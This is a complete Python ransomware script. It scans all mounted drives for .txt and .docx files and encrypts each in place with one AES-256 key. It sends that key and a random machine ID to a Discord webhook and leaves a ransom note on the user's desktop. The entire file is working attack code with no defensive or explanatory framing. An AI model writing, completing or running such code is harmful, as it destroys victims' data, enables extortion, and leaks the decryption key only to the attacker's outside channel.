import os
import random
import string
import secrets
import requests
import psutil  # To list drives
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from pathlib import Path
import sys

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL'

# Scan all mounted drives
def get_all_drives():
    drives = []
    partitions = psutil.disk_partitions()
    for partition in partitions:
        drives.append(partition.mountpoint)
    return drives

# Scan files with specified extensions in all drives
def scan_files(extensions):
    files_to_encrypt = []
    drives = get_all_drives()
    
    for drive in drives:
        for root, _, files in os.walk(drive):
            for file in files:
                if file.endswith(extensions):
                    files_to_encrypt.append(os.path.join(root, file))
    return files_to_encrypt

def generate_aes_key():
    return secrets.token_bytes(32)  # 256-bit key

def encrypt_file(file_path, aes_key):
    try:
        backend = default_backend()
        iv = secrets.token_bytes(16)  # 128-bit IV
        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(128).padder()

        with open(file_path, 'rb') as file:
            data = file.read()

        padded_data = padder.update(data) + padder.finalize()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

        with open(file_path, 'wb') as file:
            file.write(iv + encrypted_data)

        return True
    except PermissionError:
        print(f"Permission denied: {file_path}")
        return False

def generate_machine_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def send_key_to_discord(machine_id, aes_key):
    data = {
        "content": f"Machine ID: {machine_id}\nAES Key: {aes_key.hex()}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code == 204:
        print("Successfully sent the AES key and machine ID to Discord.")
    else:
        print(f"Failed to send data to Discord. Status Code: {response.status_code}")

def write_message_to_desktop(message):
    desktop_path = Path(os.path.expanduser("~/Desktop"))
    message_file_path = desktop_path / "message.txt"
    with open(message_file_path, 'w') as message_file:
        message_file.write(message)
    print(f"Message written to: {message_file_path}")

def main():
    extensions = ('.txt', '.docx')
    files = scan_files(extensions)

    if not files:
        print("No files found with the specified extensions.")
        sys.exit()

    aes_key = generate_aes_key()

    for file_path in files:
        encrypt_file(file_path, aes_key)

    machine_id = generate_machine_id()

    send_key_to_discord(machine_id, aes_key)

    custom_message = "Your files have been encrypted. Contact us with your machine ID for decryption."
    write_message_to_desktop(custom_message)

if __name__ == "__main__":
    main()
